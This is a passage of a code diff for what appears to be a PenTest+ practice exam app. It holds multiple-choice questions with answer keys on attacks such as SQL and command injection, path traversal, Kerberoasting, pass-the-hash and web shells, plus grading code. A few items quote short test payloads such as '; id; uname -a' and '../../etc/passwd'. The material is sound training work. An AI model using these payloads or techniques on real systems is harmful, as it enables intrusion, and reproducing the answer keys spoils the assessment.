severity combined with exposure and asset value", "Scanner list order", "Finding description length"], "answer": 1, "explain": "Prioritization weighs severity against exposure and asset value so the highest business risk is fixed first. <span class=\"mcq-ref\"><strong>Reference:</strong> NIST SP 800-30; CompTIA PT0-003 Vulnerability Analysis</span>"}, {"domain": "Vulnerability Discovery & Analysis", "topic": "Exploit stability risk", "stem": "Open 445/3389 on a legacy Windows host with SMB signing off. Which action most risks crashing the target?", "options": ["Running safe NSE scripts", "A kernel-level SMB exploit (EternalBlue-class)", "One Hydra attempt per second", "A reverse DNS lookup"], "answer": 1, "explain": "Kernel SMB exploits can blue-screen legacy or unpatched hosts; testers weigh this stability risk and coordinate per the RoE. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK Exploitation of Remote Services; CompTIA PT0-003 Vulnerability Analysis</span>"}, {"domain": "Vulnerability Discovery & Analysis", "topic": "Attack surface mapping", "stem": "Before exploitation, why map exposed services and versions across in-scope hosts?", "options": ["To pad the report", "To match services to known vulnerabilities and plan validated paths", "To avoid writing exploits", "To skip authorization"], "answer": 1, "explain": "Mapping services and versions links the environment to known vulnerabilities so the tester plans efficient, validated attempts. <span class=\"mcq-ref\"><strong>Reference:</strong> NIST SP 800-115 §4; CompTIA PT0-003 Vulnerability Analysis</span>"}, {"domain": "Vulnerability Discovery & Analysis", "topic": "DROWN", "stem": "A finding states that supporting SSLv2 can let an attacker decrypt TLS sessions sharing the RSA key. Which weakness is this?", "options": ["DROWN (SSLv2 cross-protocol attack)", "Heartbleed", "Shellshock", "BEAST"], "answer": 0, "explain": "DROWN abuses servers that still allow SSLv2 to decrypt TLS traffic that reuses the same RSA key; disabling SSLv2 remediates it. <span class=\"mcq-ref\"><strong>Reference:</strong> CVE-2016-0800 (DROWN); CompTIA PT0-003 Vulnerability Analysis</span>"}, {"domain": "Attacks & Exploits", "topic": "Bash loop syntax", "stem": "A tester's script fails with <code>syntax error near unexpected token</code> on a <code>for</code> loop. Which fix resolves it?", "options": ["Add the <code>do</code> keyword before the loop body", "Switch bash to zsh", "Rename the variable", "Add sudo"], "answer": 0, "explain": "A bash for loop requires the do keyword before its body executes; omitting it causes this syntax error. <span class=\"mcq-ref\"><strong>Reference:</strong> GNU Bash manual (looping); CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Try/except", "stem": "A Python mailbox script dies when one host refuses the connection. Which construct lets it continue past failures?", "options": ["A do/while loop", "An iterator", "A try/except block", "An if/else"], "answer": 2, "explain": "A try/except block catches runtime exceptions so the script can log the error and keep going. <span class=\"mcq-ref\"><strong>Reference:</strong> Python docs (errors); CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "SQL injection", "stem": "Entering <code>' OR '1'='1</code> in a login field grants access without valid credentials. Which weakness is this?", "options": ["Improper input validation leading to SQL injection", "A weak TLS cipher", "Missing MFA only", "A kernel buffer overflow"], "answer": 0, "explain": "User input is concatenated into the SQL query without parameterization; prepared statements and validation fix it. <span class=\"mcq-ref\"><strong>Reference:</strong> OWASP WSTG-INPV-05; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "OS command injection", "stem": "A diagnostics page pings a user-supplied host. Which input best tests for OS command injection on Linux?", "options": ["<code>; id; uname -a</code>", "<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>", "<code>' OR 1=1 --</code>", "<code>../../etc/passwd</code>"], "answer": 0, "explain": "Chaining with <code>;</code> then benign commands checks whether input reaches an OS shell; validation and avoiding shell calls remediate it. <span class=\"mcq-ref\"><strong>Reference:</strong> OWASP WSTG-INPV-12; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Stored vs reflected XSS", "stem": "Which best distinguishes stored from reflected cross-site scripting?", "options": ["Stored XSS persists on the server and runs for later visitors; reflected XSS is echoed in the immediate response", "Stored XSS affects only the attacker", "Reflected XSS needs database write access", "They are identical"], "answer": 0, "explain": "Stored XSS lives in server-side storage and runs for anyone who views it; reflected XSS is delivered in one request/response. Output encoding mitigates both. <span class=\"mcq-ref\"><strong>Reference:</strong> OWASP WSTG-CLNT-01; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "CSRF", "stem": "Cross-site request forgery succeeds by doing what?", "options": ["Reading arbitrary server files", "Causing an authenticated user's browser to submit an unwanted request", "Decrypting TLS on the wire", "Overflowing a buffer"], "answer": 1, "explain": "CSRF rides a logged-in session to perform state-changing actions; anti-CSRF tokens and SameSite cookies defend against it. <span class=\"mcq-ref\"><strong>Reference:</strong> OWASP WSTG-SESS-05; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Path traversal", "stem": "A parameter accepts <code>../../../../etc/passwd</code> and returns the file. Which class and fix apply?", "options": ["Path traversal; validate and canonicalize input, restrict file access", "XSS; add output encoding", "Weak TLS; upgrade the cipher", "Open redirect; validate the URL"], "answer": 0, "explain": "Path traversal abuses unsanitized file paths; canonicalizing input and least-privilege file access remediate it. <span class=\"mcq-ref\"><strong>Reference:</strong> OWASP WSTG-ATHZ-01; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Session fixation", "stem": "An app issues a session cookie before login and keeps the same value after login. Which flaw is this?", "options": ["JWT manipulation", "Cookie poisoning", "Session fixation", "Hash collision"], "answer": 2, "explain": "Failing to regenerate the session identifier at login is session fixation; rotate the token on authentication. <span class=\"mcq-ref\"><strong>Reference:</strong> OWASP WSTG-SESS-03; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Predictable tokens", "stem": "A session cookie Base64-decodes to <code>user:91536</code>, then <code>user:91944</code> next login. Which risk does this signal?", "options": ["Strong randomness", "Predictable session tokens enabling session hijacking", "Perfect forward secrecy", "A hash collision"], "answer": 1, "explain": "Encoding a username plus a sequential counter instead of a random, protected token enables session prediction/hijacking. <span class=\"mcq-ref\"><strong>Reference:</strong> OWASP WSTG-SESS-01; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "NTLM relay", "stem": "An attacker forwards a captured authentication to a second server to act as the victim, without cracking the hash. This is:", "options": ["An NTLM/SMB relay attack", "A dictionary attack", "A SYN flood", "DNS cache poisoning"], "answer": 0, "explain": "Relay attacks forward captured NTLM auth to another host; enforcing SMB signing and limiting NTLM mitigate it. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK T1557; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "LLMNR poisoning", "stem": "Which tool poisons LLMNR/NBT-NS to capture authentication material on a local segment?", "options": ["Responder", "Nmap", "Netcat", "Nikto"], "answer": 0, "explain": "Responder answers LLMNR/NBT-NS/mDNS queries to capture credentials; disabling those protocols defends against it. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK T1557.001; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Kerberoasting", "stem": "Kerberoasting abuses Active Directory by targeting what?", "options": ["Service-account tickets (SPNs) that can be cracked offline", "Door-badge systems", "Web TLS certificates", "BIOS passwords"], "answer": 0, "explain": "It requests service tickets for SPN accounts and cracks them offline; strong service passwords and gMSAs reduce the risk. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK T1558.003; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Golden ticket", "stem": "Forging a Kerberos TGT from the KRBTGT hash and injecting it to access services is known as a:", "options": ["Golden ticket attack", "Pass-the-cookie attack", "SYN flood", "Padding-oracle attack"], "answer": 0, "explain": "A golden ticket forges a TGT using the KRBTGT key, granting broad domain access; rotating KRBTGT twice invalidates forged tickets. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK T1558.001; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "GPP cpassword", "stem": "Why are legacy Group Policy Preferences in SYSVOL a credential risk?", "options": ["They disable Kerberos", "They stored cpassword values encrypted with a publicly known key, allowing recovery", "They block LDAP", "They rotate automatically"], "answer": 1, "explain": "GPP XML in SYSVOL historically held cpassword encrypted with a published AES key, so those credentials can be decrypted. <span class=\"mcq-ref\"><strong>Reference:</strong> Microsoft MS14-025; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Payload generation", "stem": "Within Metasploit, what is msfvenom used for?", "options": ["Generating and encoding payloads in various formats", "Port scanning", "Capturing Wi-Fi handshakes", "DNS enumeration"], "answer": 0, "explain": "msfvenom builds standalone payloads and applies encoders/formats for exploitation. <span class=\"mcq-ref\"><strong>Reference:</strong> Metasploit documentation; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Password spraying", "stem": "How does password spraying differ from brute force?", "options": ["It tries a few common passwords across many accounts to avoid lockouts", "It tries millions of passwords on one account fast", "It only works offline", "It needs physical access"], "answer": 0, "explain": "Spraying tests a small set of likely passwords against many usernames to stay under lockout thresholds; lockout plus MFA defend against it. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK T1110.003; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Spray pacing", "stem": "Which approach least likely triggers account lockouts or IP blocks during authentication testing?", "options": ["Rapid Hydra brute force with a huge wordlist", "Low-and-slow spraying with a delay between attempts", "A nested shell loop firing as fast as possible", "Unthrottled parallel requests"], "answer": 1, "explain": "Low-and-slow spraying with delays reduces request velocity and avoids lockouts and IP blocks. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK T1110; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Online login testing", "stem": "Which tool tests whether leaked passwords authenticate against an SSH service for valid users?", "options": ["BloodHound", "Responder", "Burp Suite", "Hydra"], "answer": 3, "explain": "Hydra performs network authentication testing across protocols such as SSH, FTP, and SMB. <span class=\"mcq-ref\"><strong>Reference:</strong> Hydra documentation; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Offline cracking", "stem": "After capturing NetNTLMv2 hash material, which next step avoids generating online auth noise?", "options": ["Brute-force the live login with Hydra", "Load the hash into an offline cracker such as hashcat or John", "Relay it to the DC immediately", "Spray the password across the domain"], "answer": 1, "explain": "Offline cracking recovers the password without live authentication attempts that cause noise or lockouts. <span class=\"mcq-ref\"><strong>Reference:</strong> hashcat documentation; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Hash identification", "stem": "A recovered hash begins with <code>$2y$</code>. Which algorithm does this indicate?", "options": ["bcrypt", "MD5", "NTLM", "SHA-1"], "answer": 0, "explain": "The <code>$2a$/$2y$</code> prefix identifies bcrypt, a slow salted algorithm; recognizing the format guides the cracking mode. <span class=\"mcq-ref\"><strong>Reference:</strong> hashcat example hashes; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Rogue AP", "stem": "An attacker stands up an access point broadcasting the corporate SSID to capture clients. This attack is:", "options": ["An evil twin", "ARP poisoning", "Pass-the-hash", "A SYN flood"], "answer": 0, "explain": "An evil twin mimics a legitimate SSID so clients associate with the attacker; 802.1X with server-certificate validation helps prevent it. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK T1557; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Deauth and PMF", "stem": "Within an authorized Wi-Fi test, why send deauthentication frames to a WPA2 client, and what control blocks it?", "options": ["To crash the AP; blocked by WEP", "To force reconnection so the 4-way handshake can be captured; blocked by 802.11w (PMF)", "To decrypt WPA3 instantly; blocked by MAC filtering", "To change AP firmware; blocked by a VLAN"], "answer": 1, "explain": "Deauth frames force reassociation to capture the handshake for offline PSK analysis; Protected Management Frames (802.11w) mitigate deauth abuse. <span class=\"mcq-ref\"><strong>Reference:</strong> IEEE 802.11w; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "WPA3 vs WPA2", "stem": "APs 1/2/4 run WPA3 and AP3 runs WPA2. Which attack works only against AP3?", "options": ["Brute force", "Signal jamming", "Evil twin", "Unauthenticated deauthentication"], "answer": 3, "explain": "WPA3 enforces Protected Management Frames, so unauthenticated deauth applies only to the WPA2 AP. <span class=\"mcq-ref\"><strong>Reference:</strong> IEEE 802.11w / WPA3; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "6 GHz band", "stem": "A capture adapter in monitor mode cannot see the scoped SSID. What is the most likely cause?", "options": ["The SSID is on 6 GHz (Wi-Fi 6E) and the adapter only supports 2.4/5 GHz", "The SSID is hidden forever", "Wi-Fi is disabled globally", "Monitor mode is illegal"], "answer": 0, "explain": "If the network uses the 6 GHz band and the adapter supports only 2.4/5 GHz, it cannot see those frames. <span class=\"mcq-ref\"><strong>Reference:</strong> IEEE 802.11ax (6 GHz); CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Social engineering", "stem": "A tester phones an employee pretending to be IT to extract a password. This is:", "options": ["Pretexting (social engineering)", "SQL injection", "Man-in-the-middle", "Privilege escalation"], "answer": 0, "explain": "Pretexting uses a fabricated identity and scenario to extract information; awareness training and verification defend against it. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK T1598; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Whaling", "stem": "A crafted urgent-invoice email aimed specifically at the CFO is an example of:", "options": ["Whaling", "Smishing", "Watering hole", "Tailgating"], "answer": 0, "explain": "Targeted phishing aimed at senior executives is whaling, a sub-type of spear phishing. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK T1566; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Default credentials", "stem": "A tester logs into an admin console with <code>admin/admin</code>. The root-cause finding is:", "options": ["Unchanged default credentials", "A zero-day", "A race condition", "A TLS downgrade"], "answer": 0, "explain": "Shipped default logins must be changed; the fix is forcing credential changes and disabling defaults. <span class=\"mcq-ref\"><strong>Reference:</strong> OWASP WSTG-ATHN-02; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Unquoted service path", "stem": "Many services start as SYSTEM from paths with spaces. Which Windows escalation does this enable?", "options": ["Credential dumping", "Local file inclusion", "Unquoted service path injection", "DLL signing bypass"], "answer": 2, "explain": "An unquoted service path with spaces lets a writable earlier path be executed with the service's privileges; quoting paths fixes it. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK T1574.009; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Client certificate", "stem": "A target returns HTTP 403 due to mutual-TLS client-cert requirements. What lets an authorized tester proceed?", "options": ["Spoofing the server MAC", "Presenting a valid X.509 client certificate", "Using an old browser", "Resetting file permissions"], "answer": 1, "explain": "Mutual TLS requires a valid client certificate; presenting an authorized X.509 cert satisfies the control. <span class=\"mcq-ref\"><strong>Reference:</strong> RFC 8446 (TLS 1.3) client auth; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Prompt injection", "stem": "A support chatbot can be coaxed by crafted input into ignoring its rules and leaking data. Which attack is this?", "options": ["Container escape", "Output fuzzing", "Prompt injection", "Model theft"], "answer": 2, "explain": "Prompt injection uses crafted input to override an LLM's intended instructions and guardrails; input/output controls mitigate it. <span class=\"mcq-ref\"><strong>Reference:</strong> OWASP Top 10 for LLM Applications (LLM01); CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Attacks & Exploits", "topic": "Web fuzzing", "stem": "Community-edition Burp Intruder is too slow for high-volume path fuzzing. Which tool accelerates it?", "options": ["TruffleHog", "Postman", "Wfuzz", "WPScan"], "answer": 2, "explain": "Wfuzz is a fast CLI web fuzzer for wordlists against URLs, parameters, and headers. <span class=\"mcq-ref\"><strong>Reference:</strong> Wfuzz documentation; CompTIA PT0-003 Attacks & Exploits</span>"}, {"domain": "Post-exploitation & Lateral Movement", "topic": "Pass-the-hash", "stem": "Pass-the-hash lets an attacker do what?", "options": ["Authenticate using a captured NTLM hash without the plaintext password", "Decrypt the password instantly", "Reset the victim's password", "Bypass TLS validation"], "answer": 0, "explain": "NTLM can accept the hash itself, so a stolen hash grants access without cracking; Credential Guard and least privilege reduce exposure. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK T1550.002; CompTIA PT0-003 Post-exploitation</span>"}, {"domain": "Post-exploitation & Lateral Movement", "topic": "Pivoting", "stem": "Routing tools through a compromised dual-homed host to reach an unreachable subnet is called:", "options": ["Pivoting", "Fuzzing", "Enumeration", "Sandboxing"], "answer": 0, "explain": "Pivoting uses a foothold as a relay to reach segments the tester cannot touch directly, often via a proxy or port forward. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK T1090; CompTIA PT0-003 Post-exploitation</span>"}, {"domain": "Post-exploitation & Lateral Movement", "topic": "Scheduled-task persistence", "stem": "A tester creates a task set to run a payload at logon as SYSTEM. What does this accomplish?", "options": ["Privilege de-escalation", "Maintaining access across reboots (persistence)", "Disabling the firewall", "Network sniffing"], "answer": 1, "explain": "A logon-triggered scheduled task re-launches the payload, maintaining or regaining access; defenders audit and remove such tasks. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK T1053.005; CompTIA PT0-003 Post-exploitation</span>"}, {"domain": "Post-exploitation & Lateral Movement", "topic": "Web shell persistence", "stem": "A tester appends a PHP command handler to a web-accessible script. The goal is to:", "options": ["Prevent detection", "Establish a persistent command channel over HTTP", "Move laterally only", "Encrypt the disk"], "answer": 1, "explain": "A web shell gives a persistent command-execution channel if the initial shell drops; cleanup must remove it post-engagement. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK T1505.003; CompTIA PT0-003 Post-exploitation</span>"}, {"domain": "Post-exploitation & Lateral Movement", "topic": "Credential dumping", "stem": "Mimikatz is most commonly used on Windows to do what?", "options": ["Extract credentials and tickets from LSASS memory", "Deauthenticate Wi-Fi clients", "Run SQL injection", "Scan UDP ports"], "answer": 0, "explain": "Mimikatz harvests credentials, hashes, and Kerberos tickets from LSASS; Credential Guard and restricting debug rights hinder it. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK T1003.001; CompTIA PT0-003 Post-exploitation</span>"}, {"domain": "Post-exploitation & Lateral Movement", "topic": "Lateral movement", "stem": "Which pair is commonly abused for remote command execution during lateral movement in a domain?", "options": ["PsExec and WMI", "FTP and Telnet", "DHCP and ARP", "SNMP and ICMP"], "answer": 0, "explain": "PsExec (service-based execution) and WMI run commands on remote hosts once credentials are obtained; monitoring and least privilege detect it. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK T1021 / T1047; CompTIA PT0-003 Post-exploitation</span>"}, {"domain": "Post-exploitation & Lateral Movement", "topic": "Living off the land", "stem": "Using built-ins like PowerShell, certutil, or bitsadmin instead of custom malware is known as:", "options": ["Living off the land (LOTL)", "Static analysis", "Threat modeling", "Fuzzing"], "answer": 0, "explain": "LOTL abuses pre-installed, trusted tools to blend in; application control and command-line logging help detect misuse. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK (LOLBins); CompTIA PT0-003 Post-exploitation</span>"}, {"domain": "Post-exploitation & Lateral Movement", "topic": "LOLBin transfer", "stem": "Which Windows binary is commonly abused to download/transfer files over HTTP during post-exploitation?", "options": ["procdump.exe", "msbuild.exe", "bitsadmin.exe", "notepad.exe"], "answer": 2, "explain": "bitsadmin manages BITS jobs and can transfer files over HTTP/HTTPS, a common living-off-the-land technique. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK T1197; CompTIA PT0-003 Post-exploitation</span>"}, {"domain": "Post-exploitation & Lateral Movement", "topic": "Privilege enumeration", "stem": "On a Windows foothold, what does <code>whoami /priv</code> help the tester find?", "options": ["Current token privileges that may enable escalation", "Open UDP ports", "DNS records", "Wi-Fi handshakes"], "answer": 0, "explain": "It lists the token's privileges (for example SeImpersonate), guiding which local escalation paths apply. <span class=\"mcq-ref\"><strong>Reference:</strong> Microsoft whoami docs; CompTIA PT0-003 Post-exploitation</span>"}, {"domain": "Post-exploitation & Lateral Movement", "topic": "AD attack-path mapping", "stem": "Which workflow collects AD object/ACL data and analyzes escalation paths as a graph?", "options": ["Run SharpHound, import into BloodHound, run Cypher queries", "Run Hydra, then Nmap", "Run Nikto, then sqlmap", "Run Responder, then Wireshark"], "answer": 0, "explain": "SharpHound collects AD sessions, groups, and ACLs; BloodHound graphs them to reveal attack paths via Cypher queries. <span class=\"mcq-ref\"><strong>Reference:</strong> BloodHound documentation; CompTIA PT0-003 Post-exploitation</span>"}, {"domain": "Post-exploitation & Lateral Movement", "topic": "Workgroup lateral movement", "stem": "With local admin on a non-domain Windows host, which step best enables lateral movement?", "options": ["Craft Kerberos tickets", "Dump local credentials/hashes to test reuse or pass-the-hash", "Join the host to a domain", "Disable the NIC"], "answer": 1, "explain": "In a workgroup there is no Kerberos; dumping local hashes supports password-reuse and pass-the-hash movement. <span class=\"mcq-ref\"><strong>Reference:</strong> MITRE ATT&CK T1003 / T1550; CompTIA PT0-003 Post-exploitation</span>"}, {"domain": "Post-exploitation & Lateral Movement", "topic": "Post-exploitation enumeration", "stem": "A tester runs <code>sudo -l</code>, <code>ip route</code>, <code>ss -tunap</code>, and <code>who</code>. What is the purpose?", "options": ["Formatting the disk", "Mapping privileges, reachability, and sessions to prepare lateral movement", "Patching the host", "Capturing Wi-Fi"], "answer": 1, "explain": "Checking privileges, routes, connections, and sessions maps internal reachability and lateral-movement opportunities. <span class=\"mcq-ref\"><strong>Reference:</strong> NIST SP 800-115 §4; CompTIA PT0-003 Post-exploitation</span>"}, {"domain": "Post-exploitation & Lateral Movement", "topic": "Exfiltration caution", "stem": "When demonstrating exfiltration, why avoid moving real sensitive client data off-site?", "options": ["Exfiltration cannot be shown otherwise", "Proof of access can be shown without removing actual sensitive data, avoiding new exposure", "It would improve security", "Tools cannot transfer files"], "answer": 1, "explain": "Removing genuine sensitive data creates real risk; testers prove the path with benign markers or minimal proof per the RoE. <span class=\"mcq-ref\"><strong>Reference:</strong> NIST SP 800-115 §3; CompTIA PT0-003 Post-exploitation</span>"}];
@@ -1705,6 +2085,7 @@ function renderQuestion() {
   else if (q.type === "sim") bodySim(q, st, stage);
   else if (q.type === "hotspot") bodyHotspot(q, st, stage);
   else if (q.type === "recon2") bodyRecon(q, st, stage);
+  else if (q.type === "websim") bodyWebsim(q, st, stage);
 
   $("examScroll").scrollTop = 0;
 }
@@ -1756,6 +2137,7 @@ function gradeQuestion(q, st) {
   if (q.type === "sim") { const v = st.ans.vuln === q.vuln.answer ? 1 : 0; const good = st.ans.rem.filter(x => q.rem.answers.includes(x)).length, bad = st.ans.rem.length - good; return { pts: v + Math.max(0, good - bad), max: 1 + q.rem.answers.length, answered: st.ans.vuln !== "" || st.ans.rem.length > 0 }; }
   if (q.type === "hotspot") { const good = st.sel.filter(i => q.remove.includes(i)).length, bad = st.sel.length - good; return { pts: Math.max(0, good - bad) + (st.tool === q.tool.answer ? 1 : 0), max: q.remove.length + 1, answered: st.sel.length > 0 || st.tool !== "" }; }
   if (q.type === "recon2") { const p1 = st.p1 === q.part1.answer ? 1 : 0; const esc = st.esc === q.part2.escAnswer ? 1 : 0; const good = st.rem.filter(x => q.part2.remAnswers.includes(x)).length, bad = st.rem.length - good; return { pts: p1 + esc + Math.max(0, good - bad), max: 2 + q.part2.remAnswers.length, answered: st.p1 !== "" || st.esc !== "" || st.rem.length > 0 }; }
+  if (q.type === "websim") { const good = q.certAnswer.filter((a, i) => st.steps[i] === a).length, extra = st.src.length || st.ck.length ? 1 : 0; return { pts: Math.max(0, good - extra), max: q.certAnswer.length, answered: st.steps.some(Boolean) || st.src.length > 0 || st.ck.length > 0 }; }
   return { pts: 0, max: 0, answered: false };
 }
 
